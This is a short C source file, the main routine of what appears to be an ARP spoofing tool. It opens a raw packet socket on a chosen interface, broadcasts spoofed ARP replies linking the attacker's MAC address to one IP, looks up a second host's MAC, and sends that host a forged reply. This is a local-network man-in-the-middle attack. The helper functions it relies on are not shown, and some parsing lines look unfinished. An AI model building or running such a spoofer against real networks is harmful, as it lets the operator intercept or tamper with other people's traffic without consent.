#include "ARP_Headers.h"
#include "ARP_Sniffer.h"
#include "ARP_Packet.h"
#include "ARP_Spoofer.h"
#include "ARP_Log.h"
#include "ARP_Utils.h"

int main(int args, char* argv[])
{
    if(args != 4)
    {
        LOG("Usage: %s <interface> <first-ip> <second-ip>", argv[0]);

        exit(EXIT_FAILURE);
    }

    IP frst_ip;
    IP scnd_ip;
    MAC my_mac, trgrt_mac;
    
    get_my_mac(argv[1], my_mac);
    LOG(MAC_FORMAT(my_mac));
    LOG("\n");

    sscanf(argv[2], IP_FORMAT((uint32_t*) &frst_ip) );     // TODO
    LOG(IP_FORMAT(frst_ip));
    LOG("\n");

    sscanf(argv[3], IP_FORMAT((uint32_t*) &scnd_ip));
    LOG(IP_FORMAT(scnd_ip));
    LOG("\n");
    

    struct sockaddr_ll intrfce;
    intrfce.sll_ifindex = if_nametoindex(argv[1]);

    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));

    broadcast_spoofed_ip(my_mac, frst_ip, scnd_ip,&intrfce, sock);
    get_target_mac(sock, scnd_ip, trgrt_mac);
    send_spoofed_ip(my_mac, frst_ip, trgrt_mac, scnd_ip, &intrfce, sock);

    exit(EXIT_SUCCESS);
}